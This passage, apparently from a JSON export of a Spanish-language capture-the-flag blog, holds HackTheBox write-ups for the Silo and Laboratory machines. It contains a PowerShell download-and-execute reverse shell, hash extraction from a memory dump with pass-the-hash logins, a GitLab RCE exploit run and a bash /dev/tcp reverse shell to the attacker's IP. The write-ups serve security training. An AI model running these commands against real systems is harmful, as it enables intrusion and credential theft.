La movemos al final con nuestra IP y puerto: . . . }Invoke-PowerShellTcp -Reverse -IPAddress 10. 10. 14. 15 -Port 4433Guardamos, creamos un servidor web r√°pidamente: ‚ù≠ python3 -m http. serverServing HTTP on 0. 0. 0. 0 port 8000 (http://0. 0. 0. 0:8000/) . . . Y ahora ejecutamos en la web-shell: powershell -c  IEX(New-Object Net. WebClient). downloadString('http://10. 10. 14. 15:8000/Itcp. ps1'); Recibimos una peticion en el servidor y despues de unos segundos: OPAAA, tamos dentro de la m√°quina, si si si ;) lindo, tenemos acceso a la flag del user.  Finalmente no explotamos el CVE :( (lo intente con algunos poc pero no lo logre). ‚Ä¶ Escalada de privilegios #: En el directorio de un usuario llamado phineas tenemos: PS C:\Users\Phineas\Desktop&gt; ls   Directory: C:\Users\Phineas\DesktopMode        LastWriteTime   Length Name----        -------------   ------ -----a---     1/5/2018 10:56 PM    300 Oracle issue. txt-a---     1/4/2018  9:41 PM     32 user. txtPS C:\Users\Phineas\Desktop&gt;PS C:\Users\Phineas\Desktop&gt; type  Oracle issue. txt Support vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested):Dropbox link provided to vendor (and password under separate cover). Dropbox link https://www. dropbox. com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0link password:?%Hm8646uC$Jmmm, parece ser una petici√≥n de un equipo a Oracle pidiendo un dump de memoria para encontrar alg√∫n error. Les responden con un link y una password para descargar lo que sea que tenga el link. Pero si nos dirigimos al link y colocamos esa contrase√±a, falla, no la acepta :s Despu√©s de un rato intentando descargarlo desde Linux y buscando en internet, decid√≠ movernos el archivo a nuestra m√°quina y ver que tipo de archivo es, as√≠ validamos si es que tiene alg√∫n truco, vemos esto: Nos compartimos una carpeta mediante smb: ‚ù≠ smbserver. py smbFolder $(pwd) -smb2supportImpacket v0. 9. 22. dev1+20200909. 150738. 15f3df26 - Copyright 2020 SecureAuth Corporation[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3. 0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1. 0[*] Config file parsed[*] Config file parsed[*] Config file parsedY lo transferimos: PS C:\Users\Phineas\Desktop&gt; copy  Oracle issue. txt  \\10. 10. 14. 15\smbFolder\Oracle. txtY: ‚ù≠ file Oracle. txt Oracle. txt: ISO-8859 text, with CRLF line terminators‚ù≠ cat Oracle. txt. . . link password:ÔøΩ%Hm8646uC$Jmmm, parece que hay un simbolo extra√±o, si validamos el contenido del archivo en la web (apoyandonos del servidor web, quizas asi interprete algo distinto) vemos otro resultado de contrase√±a: . . . link password:≈Å%Hm8646uC$Pero tampoco nos funciona :( De nuevo dando vueltas, pero ahora jugando con la web-shell para desde ah√≠ leer el contenido del archivo, obtenemos otra contrase√±a distinta: . . . link password:¬£%Hm8646uC$Probandola ahora si nos permite acceder al recurso :) Perfeeeeeee o. O tamos, descarguemos el archivo . zip y empecemos a jugar‚Ä¶ Zip File (Memory Dump) - Volatility: Decomprimimos: ‚ù≠ unzip SILO-20180105-221806. zip Archive: SILO-20180105-221806. zip inflating: SILO-20180105-221806. dmpEntooooonces, tenemos un archivo que contiene un volcado de memoria‚Ä¶  Memory dump es un registro no estructurado del contenido de la memoria en un momento concreto, generalmente utilizado para depurar un programa que ha finalizado su ejecuci√≥n incorrectamente. volcado de memoria.  M√°s info sobre los volcados de memoria y su importancia. Listos, dando unas vuelticas encontramos varias referencias hacia la herramienta volatility la cual en t√©rminos generales nos permite saber si un equipo ha sido infectado o no, nos permite recorrer los procesos que est√°n en ejecuci√≥n mientras se hace el volcado para posteriormente analizarlos. Lo primero que debemos hacer es obtener (o un indicio) el perfil (sistema operativo, servicio de empaquetado y arquitectura (32 o 64 bits)) del cual viene el volcado, para esto usaremos imageinfo: ‚ù≠ volatility imageinfo -f SILO-20180105-221806. dmpVolatility Foundation Volatility Framework 2. 6INFO  : volatility. debug  : Determining profile based on KDBG search. . .      Suggested Profile(s) : Win8SP0x64, Win10x64_17134, Win81U1x64, Win10x64_10240_17770, Win10x64_14393, Win10x64_10586, Win10x64, Win2012R2x64_18340, Win10x64_16299, Win2012R2x64, Win2016x64_14393, Win2012x64, Win8SP1x64_18340, Win8SP1x64, Win10x64_15063 (Instantiated with Win10x64_15063)           AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS)           AS Layer2 : WindowsCrashDumpSpace64 (Unnamed AS)           AS Layer3 : FileAddressSpace (/silo/content/dump/SILO-20180105-221806. dmp)           PAE type : No PAE              DTB : 0x1a7000L             KDBG : 0xf80078520a30L     Number of Processors : 2   Image Type (Service Pack) : 0        KPCR for CPU 0 : 0xfffff8007857b000L        KPCR for CPU 1 : 0xffffd000207e8000L       KUSER_SHARED_DATA : 0xfffff78000000000L      Image date and time : 2018-01-05 22:18:07 UTC+0000   Image local date and time : 2018-01-05 22:18:07 +0000Vemos vaaaarios perfiles (Suggested Profile(s)), por lo tanto si recordamos al inicio que mediante crackmapexec vimos algo relacionado con Windows 2012, pues para aclararlo apoy√©monos del comando systeminfo en la m√°quina: PS C:\Users\Phineas\Desktop&gt; systeminfoHost Name:         SILOOS Name:          Microsoft Windows Server 2012 R2 StandardOS Version:        6. 3. 9600 N/A Build 9600OS Manufacturer:      Microsoft CorporationOS Configuration:     Standalone ServerOS Build Type:       Multiprocessor FreeRegistered Owner:     Windows UserRegistered Organization:Product ID:        00252-00115-23036-AA976Original Install Date:   12/31/2017, 11:01:23 PMSystem Boot Time:     4/20/2021, 4:28:44 PMSystem Manufacturer:    VMware, Inc. System Model:       VMware Virtual PlatformSystem Type:        x64-based PC. . . Bien, Microsoft Windows Server 2012 R2 Standard con arquitectura de 64 bits. Entonces tenemos 3 opciones de perfil:  Win2012R2x64_18340.  Win2012R2x64.  Win2012x64. Escojamos Win2012R2x64 que se ve sencillito u. u y sigamos (: Ahora podemos ver un √°rbol de procesos que se estaban ejecutando al momento de hacer el dump mediante el argumento pstree: ‚ù≠ volatility -f SILO-20180105-221806. dmp --profile=Win2012R2x64 pstreeVolatility Foundation Volatility Framework 2. 6Name                         Pid  PPid  Thds  Hnds Time-------------------------------------------------- ------ ------ ------ ------ ---- 0xffffe000034ac940:wininit. exe            404  316   4   0 2018-01-05 22:17:16 UTC+0000. 0xffffe00003550940:services. exe           492  404   10   0 2018-01-05 22:17:16 UTC+0000. . 0xffffe00003fe3940:svchost. exe           832  492   20   0 2018-01-05 22:17:17 UTC+0000. . 0xffffe00004fff080:VGAuthService.         1324  492   3   0 2018-01-05 22:17:18 UTC+0000. . 0xffffe000030a1080:dllhost. exe          1432  492   21   0 2018-01-05 22:17:27 UTC+0000. . 0xffffe00004e267c0:svchost. exe           920  492   25   0 2018-01-05 22:17:17 UTC+0000. . 0xffffe00003f68940:vmacthlp. exe          708  492   2   0 2018-01-05 22:17:16 UTC+0000. . 0xffffe000030b7940:dllhost. exe          1600  492   17   0 2018-01-05 22:17:27 UTC+0000. . 0xffffe00004f5c940:svchost. exe          1052  492   11   0 2018-01-05 22:17:17 UTC+0000. . 0xffffe00003fcc940:svchost. exe           800  492   63   0 2018-01-05 22:17:17 UTC+0000. . . 0xffffe000061637c0:taskhostex. exe        2368  800   7   0 2018-01-05 22:17:33 UTC+0000. . 0xffffe0000608f780:vmtoolsd. exe          1444  492   8   0 2018-01-05 22:17:18 UTC+0000. . 0xffffe00004f84940:oracle. exe           1088  492   30   0 2018-01-05 22:17:17 UTC+0000. . 0xffffe00003f22500:svchost. exe           560  492   15   0 2018-01-05 22:17:16 UTC+0000. . . 0xffffe00003224540:WmiPrvSE. exe         3056  560   19   0 2018-01-05 22:17:47 UTC+0000. . . 0xffffe00003239940:WmiPrvSE. exe         2340  560   10   0 2018-01-05 22:17:47 UTC+0000. . . 0xffffe0000315f940:SppExtComObj. E        2312  560   5   0 2018-01-05 22:17:29 UTC+0000. . . 0xffffe000030cd940:WmiPrvSE. exe         1440  560   12   0 2018-01-05 22:17:27 UTC+0000. . 0xffffe00004f2e940:spoolsv. exe           308  492   13   0 2018-01-05 22:17:17 UTC+0000. . 0xffffe00004fef940:TNSLSNR. EXE          1208  492   5   0 2018-01-05 22:17:18 UTC+0000. . 0xffffe00003117940:VSSVC. exe           2228  492   7   0 2018-01-05 22:17:29 UTC+0000. . 0xffffe000030cf940:msdtc. exe           2052  492   13   0 2018-01-05 22:17:27 UTC+0000. . 0xffffe00004e8d940:svchost. exe           340  492   16   0 2018-01-05 22:17:17 UTC+0000. . 0xffffe00003f39940:svchost. exe           604  492   15   0 2018-01-05 22:17:16 UTC+0000. . 0xffffe000060c7940:svchost. exe          1516  492   16   0 2018-01-05 22:17:19 UTC+0000. . 0xffffe0000325c940:WmiApSrv. exe          864  492   5   0 2018-01-05 22:17:48 UTC+0000. . 0xffffe00003051940:svchost. exe          2000  492   5   0 2018-01-05 22:17:27 UTC+0000. . 0xffffe00003077880:TPAutoConnSvc.         1256  492   8   0 2018-01-05 22:17:27 UTC+0000. . . 0xffffe0000301c940:TPAutoConnect.         2824  1256   3   0 2018-01-05 22:17:37 UTC+0000. . . . 0xffffe00003f698c0:conhost. exe         2832  2824   1   0 2018-01-05 22:17:37 UTC+0000. . 0xffffe00004fe93c0:OraClrAgnt. exe         1192  492   2   0 2018-01-05 22:17:18 UTC+0000. . . 0xffffe00004ff0300:agtctl. exe          1216  1192   0 ------ 2018-01-05 22:17:18 UTC+0000. . . 0xffffe000060568c0:agtctl. exe          1348  1192   0 ------ 2018-01-05 22:17:18 UTC+0000. . . 0xffffe000060767c0:agtctl. exe          1388  1192   0 ------ 2018-01-05 22:17:18 UTC+0000. . . 0xffffe00004ff3940:agtctl. exe          1264  1192   0 ------ 2018-01-05 22:17:18 UTC+0000. . 0xffffe00003149080:sppsvc. exe           2284  492   5   0 2018-01-05 22:17:29 UTC+0000. . 0xffffe00004ffc440:svchost. exe          1272  492   4   0 2018-01-05 22:17:18 UTC+0000. . 0xffffe000060a62c0:ManagementAgen         1492  492   9   0 2018-01-05 22:17:18 UTC+0000. . 0xffffe00003fb9080:svchost. exe           764  492   16   0 2018-01-05 22:17:17 UTC+0000. 0xffffe00003ed4080:lsass. exe            500  404   6   0 2018-01-05 22:17:16 UTC+0000 0xffffe000034f54c0:csrss. exe             324  316   10   0 2018-01-05 22:17:15 UTC+0000 0xffffe00000df34c0:ServerManager.          2732  2376   24   0 2018-01-05 22:17:35 UTC+0000 0xffffe00000089940:System               4   0   84   0 2018-01-05 22:17:14 UTC+0000. 0xffffe00000c9c100:smss. exe             208   4   3   0 2018-01-05 22:17:14 UTC+0000 0xffffe000034ec380:csrss. exe             396  388   10   0 2018-01-05 22:17:16 UTC+0000 0xffffe00002fee080:winlogon. exe           448  388   5   0 2018-01-05 22:17:16 UTC+0000. 0xffffe00003f6f680:dwm. exe             688  448   9   0 2018-01-05 22:17:16 UTC+0000 0xffffe00004e00680:explorer. exe           2424  2416   56   0 2018-01-05 22:17:33 UTC+0000. 0xffffe0000136d080:vmtoolsd. exe          2992  2424   8   0 2018-01-05 22:17:45 UTC+0000. 0xffffe00003203340:DumpIt. exe           2932  2424   4   0 2018-01-05 22:18:06 UTC+0000. . 0xffffe00003f8c940:conhost. exe          2764  2932   2   0 2018-01-05 22:18:06 UTC+0000Vale, tenemos los procesos siendo ejecutados mientras se efect√∫a el volcado de memoria. Despu√©s de un buen rato pensando que todos eran malignos o algo por el estilo y jugar con volatility pa ver que hacer :P Encontr√© un argumento interesante, el cual nos muestra los √∫ltimos comandos del sistema efectuados por cada proceso (los que vimos antes), esto hecho mediante cmdline: ‚ù≠ volatility -f SILO-20180105-221806. dmp --profile=Win2012R2x64 cmdline. . . # Muchas coooooooosas. . . ************************************************************************DumpIt. exe pid:  2932Command line :  C:\Users\Administrator\Desktop\DumpIt. exe  ************************************************************************. . . Encontramos la ruta de este binario, la cual hace referencia al usuario administrador :x, veamos si podemos jugar con esto‚Ä¶ (Y no, despu√©s de un rato siguiendo esta guia no logre ver nada interesante ante ese binario) Leyendo la wiki vemos cositas interesantes relacionadas con los registros del sistema. :  Volatility wiki - Registry. Estas opciones nos sirven para encontrar las direcciones en memoria de las llaves de los distintos registros usados en Windows (Registry Hives).  A hive is a logical group of keys, subkeys, and values in the registry that has a set of supporting files loaded into memory when the operating system is started or a user logs in. Registry Hives. Tenemos el argumento hivelist que nos da una lista de los registros con su direcci√≥n en memoria, path y nombre espec√≠ficos, as√≠ sabemos cu√°l es de cu√°l :) ‚ù≠ volatility -f SILO-20180105-221806. dmp --profile=Win2012R2x64 hivelistVolatility Foundation Volatility Framework 2. 6Virtual      Physical      Name------------------ ------------------ ----0xffffc0000100a000 0x000000000d40e000 \??\C:\Users\Administrator\AppData\Local\Microsoft\Windows\UsrClass. dat0xffffc000011fb000 0x0000000034570000 \SystemRoot\System32\config\DRIVERS0xffffc00001600000 0x000000003327b000 \??\C:\Windows\AppCompat\Programs\Amcache. hve0xffffc0000001e000 0x0000000000b65000 [no name]0xffffc00000028000 0x0000000000a70000 \REGISTRY\MACHINE\SYSTEM0xffffc00000052000 0x000000001a25b000 \REGISTRY\MACHINE\HARDWARE0xffffc000004de000 0x0000000024cf8000 \Device\HarddiskVolume1\Boot\BCD0xffffc00000103000 0x000000003205d000 \SystemRoot\System32\Config\SOFTWARE0xffffc00002c43000 0x0000000028ecb000 \SystemRoot\System32\Config\DEFAULT0xffffc000061a3000 0x0000000027532000 \SystemRoot\System32\Config\SECURITY0xffffc00000619000 0x0000000026cc5000 \SystemRoot\System32\Config\SAM0xffffc0000060d000 0x0000000026c93000 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER. DAT0xffffc000006cf000 0x000000002688f000 \SystemRoot\System32\Config\BBI0xffffc000007e7000 0x00000000259a8000 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER. DAT0xffffc00000fed000 0x000000000d67f000 \??\C:\Users\Administrator\ntuser. datBien, tenemos el registro SAM y el registro SYSTEM, estos son importantes, ya que los dos contienen las contrase√±as de los usuarios del sistema en formato hash (LM (Lan Manager) hash y NTLM hash).  Info - Registry SAM.  Info - What is SAM (Security Account Manager).  Info - Registry: HKEY_LOCAL_MACHINE\SAM.  Info - Windows registry information for advanced users. As√≠ que podemos aprovechar que sabemos su direcci√≥n en memoria para mediante hashdump intentar que nos muestre los hashes de los usuarios: ‚ù≠ volatility -f SILO-20180105-221806. dmp --profile=Win2012R2x64 -y 0xffffc00000028000 -s 0xffffc00000619000 hashdump -y: Tiene la direccion virtual del registro SYSTEM.  -s: Tiene la direccion virtual del registro SAM. ‚ù≠ volatility -f SILO-20180105-221806. dmp --profile=Win2012R2x64 -y 0xffffc00000028000 -s 0xffffc00000619000 hashdumpVolatility Foundation Volatility Framework 2. 6Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Phineas:1002:aad3b435b51404eeaad3b435b51404ee:8eacdd67b77749e65d3b3d5c110b0969:::Oko, tenemos hashes, ahora la parte m√°s f√°cil Podemos usar vaaaaaarias herramientas y hacer PassTheHash (e incluso intentar crackear los hashes, pero ya hemos visto en otros writeups como hacerlo, juguemos con los hashes), usaremos 2 opciones, wmiexec y crackmapexec: PassTheHash - wmiexec:  Youtube - S4vitar nos guia con el uso de winexec. Entonces, sencillamente tomamos la √∫ltima parte del hash y escribimos: ‚ù≠ wmiexec. py -hashes :9e730375b7cbcebf74ae46481e07b0c7 Administrator@10. 10. 10. 82Esperamos un momento yy: Perfectamente correcto e. e Ya estar√≠amos dentro como el usuario administrador y jugar con el sistema. Pero validemos si Phineas tambi√©n nos permite entrar: ‚ù≠ wmiexec. py -hashes :8eacdd67b77749e65d3b3d5c110b0969 Phineas@10. 10. 10. 82Impacket v0. 9. 22. dev1+20200909. 150738. 15f3df26 - Copyright 2020 SecureAuth Corporation[*] SMBv3. 0 dialect used[-] rpc_s_access_deniedPero no :( PassTheHash - evil-winrm:  https://github. com/Hackplayers/evil-winrm. Si recordamos, en nuestro escaneo vimos el puerto 5986, el cual hace referencia al servicio de Windows WinRM. Entonces Evil-WinRM nos ayuda a explotar este servicio para obtener una PowerShell ya sea con credenciales o como en nuestro caso, con un hash: ‚ù≠ evil-winrm -i 10. 10. 10. 82 -u Administrator -H 9e730375b7cbcebf74ae46481e07b0c7 Perfecto otra vez :) Volvamos a intentar con Phineas a veeeer: ‚ù≠ evil-winrm -i 10. 10. 10. 82 -u Phineas -H 8eacdd67b77749e65d3b3d5c110b0969Evil-WinRM shell v2. 3Info: Establishing connection to remote endpointError: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationErrorError: Exiting with code 1Pero no, error de nuevo :( ‚Ä¶ Igual siendo administradores (y no si√©ndolo) podemos ver el contenido de Phineas. Ac√° podr√≠amos crearnos usuarios, mover registros, deshabilitar otros, jugar con privilegios, etc, jugar mucho. Pero por ahora, hemos terminado :D Solo nos queda ver las flags.  ‚Ä¶ Linda m√°quina, la parte forense me gusto mucho, pensar en el peligro de que se filtre un volcado de memoria. Me gusto mucho esa parte. Y bueno, nos leeremos en otra ocasi√≥n, claro que si! Bendiciones y como siempreeeeeeeeeeeeeeeeeeeeeeee, a, seguir, rompiendo, todoooooooo. "
    }, {
    "id": 57,
    "url": "http://localhost:4000/htb/laboratory",
    "title": "HackTheBox - Laboratory",
    "body": "2021/04/15 - M√°quina Linux nivel f√°cil. Tendremos al lobo naranja (GitLab) :P como punto de entrada, jugaremos con Backups y archivos . bundle, obtendremos las llaves de la casa y nos haremos due√±os de la r(oo)ta mediante un PATH Hijacking.  TL;DR (Spanish writeup): Creada por: 0xc45. Wenas :3 Nos enfrentaremos al gestor de versiones GitLab, usaremos ayuda :O (/help) para centrar la b√∫squeda en la versi√≥n del software (Gitlab 12. 8. 1). Jugaremos con un exploit que nos permite ver archivos del sistema pero tambi√©n obtener una Shell (feita) como el usuario git en el hostname git. laboratory. htb. Enumerando y buscando auxilio, usaremos gitlab-backup para obtener un backup de dos repositorios. Usaremos archivos . bundle para generar un clone de cada repo. En uno nos encontraremos cosas personales :O, usaremos la llave privada id_rsa para migrar al usuario dexter. Buscando archivos relacionados con dexter encontramos un SUID llamativo, jugando con cat y ltrace vemos que est√° llamando al binario chmod sin ruta absoluta. Aprovecharemos esto para generar un PATH Hijacking donde al ejecutar el archivo interesante, obtengamos una Shell como el usuario root. Clasificaci√≥n de la m√°quina. : Bastante RealG4Life. A darleeeeeeeeee.  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto). ‚Ä¶ Tendremos como siempre 3 fases:  Enumeraci√≥n Explotaci√≥n Escalada de privilegios‚Ä¶ Enumeraci√≥n #: Como siempre empezamos realizando un escaneo de puertos sobre la maquina para saber que servicios esta corriendo. ‚Äì¬ª nmap -p- --open -v 10. 10. 10. 216 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n de S4vitar que me extrae los puertos en la clipboard   ‚Äì¬ª cat initScan # Nmap 7. 80 scan initiated Thu Jan 28 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 216# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 216 ()  Status: UpHost: 10. 10. 10. 216 ()  Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 443/open/tcp//https///    Ignored State: filtered (65532)# Nmap done at Thu Jan 28 25:25:25 2021 -- 1 IP address (1 host up) scanned in 396. 96 secondsMuy bien, tenemos los siguientes servicios:       Puerto   Descripci√≥n         22   SSH       80   HTTP       443   HTTPS (TLS)   Hagamos nuestro escaneo de versiones y scripts con base en cada puerto, con ello obtenemos informaci√≥n m√°s detallada de cada servicio: ‚Äì¬ª nmap -p 22,80,443 -sC -sV 10. 10. 10. 216 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   ‚Äì¬ª cat portScan # Nmap 7. 80 scan initiated Thu Jan 28 25:25:25 2021 as: nmap -p 22,80,443 -sC -sV -oN portScan 10. 10. 10. 216Nmap scan report for 10. 10. 10. 216Host is up (0. 19s latency). PORT  STATE SERVICE VERSION22/tcp open ssh   OpenSSH 8. 2p1 Ubuntu 4ubuntu0. 1 (Ubuntu Linux; protocol 2. 0)80/tcp open http   Apache httpd 2. 4. 41|_http-server-header: Apache/2. 4. 41 (Ubuntu)|_http-title: Did not follow redirect to https://laboratory. htb/443/tcp open ssl/http Apache httpd 2. 4. 41 ((Ubuntu))|_http-server-header: Apache/2. 4. 41 (Ubuntu)|_http-title: The Laboratory| ssl-cert: Subject: commonName=laboratory. htb| Subject Alternative Name: DNS:git. laboratory. htb| Not valid before: 2020-07-05T10:39:28|_Not valid after: 2024-03-03T10:39:28| tls-alpn: |_ http/1. 1Service Info: Host: laboratory. htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Thu Jan 28 25:25:25 2021 -- 1 IP address (1 host up) scanned in 32. 26 secondsTenemos:       Puerto   Servicio   Versi√≥n         22   SSH   OpenSSH 8. 2p1 Ubuntu       80   HTTP   Apache httpd 2. 4. 41       443   HTTPS   Apache httpd 2. 4. 41   Vemos cositas:  Hace una redirecci√≥n al dominio laboratory. htb pero al del puerto 443.  Tambi√©n al parecer tenemos otro dominio: git. laboratory. htb. Empecemos a enumerar cada servicio :) ‚Ä¶ Puerto 80 ‚åñ: Efectivamente nos redirecciona al dominio laboratory. htb, lo agregamos al archivo /etc/hosts para corregir la resoluci√≥n:  Info sobre el archivo /etc/hosts. - e-logicasoftware. com‚Äì¬ª cat /etc/hosts. . . 10. 10. 10. 216 laboratory. htb git. laboratory. htb. . . Y ahora volvemos a probar: Perfecto, veamos que podemos obtener de ah√≠‚Ä¶ Me pareci√≥ interesante y algo cr√≠ptico este apartado, as√≠ que mejor guardarlo: Pero de resto no tenemos algo interesante‚Ä¶ Recordemos el otro dominio que vimos en el escaneo (git. laboratory. htb), vamos all√≠ a ver s√≠ si funciona: Nice, tenemos GitLab activo, con la posibilidad de crearnos una cuenta e ingresar, hag√°moslo y veamos que hay dentro‚Ä¶ Pero al momento de intentar registrarnos con el correo lanz@lanz. com (y otros diferentes) obtenemos este error: 1 error prohibited this user from being saved:  Email domain is not authorized for sign-upAc√° ya me iba a empezar a complicar, pero record√©‚Ä¶ y si probamos con el dominio laboratory. htb? Osea lanz@laboratory. htb: Pos s√≠, logramos entrar, d√©mosle una vuelta a la p√°gina‚Ä¶ En /help vemos la versi√≥n: Ac√° tuve algo de suerte, hace poco hab√≠a estado jugando con el exploit que vamos a usar: Buscando en la web sobre esa versi√≥n y sus posibles exploits, nos encontramos este script que se aprovecha de una vulnerabilidad combinando dos vectores de ataque para ya sea, obtener informaci√≥n de los archivos dentro del sistema (Path Traversal) o ejecutar comandos en el sistema (RCE). Todo el proceso se logra gracias al (Path Traversal), ya que extrae la secret_key_base usada por Rails. Para posteriormente obtener ejecuci√≥n de comandos explotando una deserializaci√≥n de una cookie llamada: experimentation_subject_id.  Descripci√≥n de la vulnerabilidad. - rapid7. com/gitlab_file_read_rce.  Exploit que usaremos creado por dotPY-hax. - github. com/dotPY-hax/gitlab_RCESi revisamos el c√≥digo, solo debemos cambiar: el puerto al cual queremos que se genere la reverse Shell y el dominio con el que creara la cuenta: Ejecutemos: ‚Äì¬ª python3 gitlab_rce. pyusage: gitlab_rce. py &lt;http://gitlab:port&gt; &lt;local-ip&gt;‚Äì¬ª python3 gitlab_rce. py https://git. laboratory. htb 10. 10. 14. 159. . . Elejimos la opcion 2 y nos indica esto: Start a listener on port 4433 and hit enter (nc -vlnp 4433)Nos ponemos en escucha: ‚Äì¬ª nc -lvp 4433Y damos enter: Perfecto, tamos dentro de la m√°quina, ahora a enumerar. Pero primero hag√°mosle un tratamiento a nuestra Shell para que sea completamente interactiva, ya que si por alguna raz√≥n queremos ver los comandos anteriores o hacer CTRL + C no podremos:  S4vitar nos explica lo que debemos hacer para conseguir una Shell completamente interactiva (tratamiento de la TTY). Pero al intentarlo (o pues a m√≠ me paso) la Shell (de ruby como indicaba el exploit: ‚Äù!!RUBY REVERSE SHELL IS VERY UNRELIABLE!! WIP‚Äù) queda est√°tica y no hace nada :( As√≠ que probemos a generarnos una nueva pero en este caso ya con bash: Primero nos volvemos a poner en escucha, pero ahora en otro puerto, en mi caso el 4434 y ejecutamos en la Shell de git: bash -c 'bash -i &gt;&amp; /dev/tcp/10. 10. 14. 159/4434 0&gt;&amp;1'‚Äì¬ª nc -lvp 4434listening on [any] 4434 . . . connect to [10. 10. 14. 159] from laboratory. htb [10. 10. 10. 216] 36932bash: cannot set terminal process group (398): Inappropriate ioctl for devicebash: no job control in this shellgit@git:~/gitlab-rails/working$ ididuid=998(git) gid=998(git) groups=998(git)git@git:~/gitlab-rails/working$ script /dev/null -c bashscript /dev/null -c bashScript started, file is /dev/nullgit@git:~/gitlab-rails/working$ ididuid=998(git) gid=998(git) groups=998(git)git@git:~/gitlab-rails/working$Perfecto, ahora si procedemos a hacer el tratamiento de la TTY y a enumerar‚Ä¶ Despu√©s de buscar y buscar por todos lados me perd√≠ y no sab√≠a que m√°s hacer, sub√≠ linpeas, enumere servicios mediante ps auxwww y con el archivo /proc/net/tcp (que tiene los n√∫meros de los puertos donde hay alg√∫n servicio corriendo). Revise archivos locos por X parte, di vueltas por la mayor√≠a de carpetas y con grep no encontraba nada‚Ä¶ As√≠ que busque ayuda con el siempre fiable @TazWake, usuario de la plataforma, moderador y persona superpresta a ayudar, que con una sola frase:  ‚ÄúHave you tried gitlab-backup?‚Äù Me soluciono el dilema y adem√°s entend√≠ que no, no hab√≠a intentado esa herramienta :( Si la usamos en pocos segundos obtenemos un archivo . tar con el backup del repositorio, si nos creamos una carpeta en /dev/shm (archivos temporales) llamada test/ donde podamos extraer toda la data sin molestar a nadie, tenemos: git@git:/dev/shm/test$ gitlab-backup 2021-01-29 22:45:49 +0000 -- Dumping database . . . Dumping PostgreSQL database gitlabhq_production . . . [DONE]2021-01-29 22:45:51 +0000 -- done2021-01-29 22:45:51 +0000 -- Dumping repositories . . . * dexter/securewebsite (@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3) . . . [DONE][SKIPPED] Wiki * dexter/securedocker (@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7) . . . [DONE][SKIPPED] Wiki2021-01-29 22:45:53 +0000 -- done2021-01-29 22:45:53 +0000 -- Dumping uploads . . . 2021-01-29 22:45:53 +0000 -- done2021-01-29 22:45:53 +0000 -- Dumping builds . . . 2021-01-29 22:45:53 +0000 -- done2021-01-29 22:45:53 +0000 -- Dumping artifacts . . . 2021-01-29 22:45:53 +0000 -- done2021-01-29 22:45:53 +0000 -- Dumping pages . . . 2021-01-29 22:45:53 +0000 -- done2021-01-29 22:45:53 +0000 -- Dumping lfs objects . . . 2021-01-29 22:45:53 +0000 -- done2021-01-29 22:45:53 +0000 -- Dumping container registry images . . . 2021-01-29 22:45:53 +0000 -- [DISABLED]Creating backup archive: 1612133153_2021_01_29_12. 8. 1_gitlab_backup. tar . . . doneUploading backup archive to remote storage . . . skippedDeleting tmp directories . . . donedonedonedonedonedonedonedoneDeleting old backups . . . skippingWarning: Your gitlab. rb and gitlab-secrets. json files contain sensitive data and are not included in this backup. You will need these files to restore a backup. Please back them up manually. Backup task is done. git@git:/dev/shm/test$Buscamos el archivo para moverlo a nuestra carpeta: git@git:/dev/shm/test$ find / -name 1611956382_2021_01_29_12. 8. 1_gitlab_backup. tar 2&gt;/dev/null/var/opt/gitlab/backups/1611956382_2021_01_29_12. 8. 1_gitlab_backup. targit@git:/dev/shm/test$ mv /var/opt/gitlab/backups/1611956382_2021_01_29_12. 8. 1_gitlab_backup. tar . git@git:/dev/shm/test$ ls1611956382_2021_01_29_12. 8. 1_gitlab_backup. targit@git:/dev/shm/test$ Lo descomprimimos: git@git:/dev/shm/test$ tar -xvf 1611956382_2021_01_29_12. 8. 1_gitlab_backup. tar #e(x)traemos y (v)emos por pantalla lo que va pasando con el (f)ile. repositories/       repositories/@hashed/. . . . . . db/db/database. sql. gzuploads. tar. gzbuilds. tar. gzartifacts. tar. gzpages. tar. gzlfs. tar. gzbackup_information. ymlgit@git:/dev/shm/test$ Perfecto, nos llama la atenci√≥n el archivo database. sql. gz, procedamos a descomprimirlo tambi√©n: ‚ñø Rabbit hole :P: git@git:/dev/shm/test/db$ lsdatabase. sql. gzgit@git:/dev/shm/test/db$ gzip -d database. sql. gz git@git:/dev/shm/test/db$ lsdatabase. sqlgit@git:/dev/shm/test/db$ Tiene un mont√≥n de informaci√≥n, despu√©s de jugar un poco, intente buscar mi usuario creado en GitLab al inicio de la m√°quina: git@git:/dev/shm/test/db$ grep -i  lanz  database. sql 43   lanz  lanz  43   2021-01-29 18:48:12. 104345   2021-01-29 18:48:12. 104345   \N       \N   f    f    20   t    ready  \N   \N   \N   \N   \N    \N   \N   \N   f    48   1179648 \N   \N   \N   \N   \N   \N   \N   \N   \N   \N   \N   \N   1    \N   \N   \N   \N101   43   Namespace    lanz  2021-01-29 18:48:12. 109994   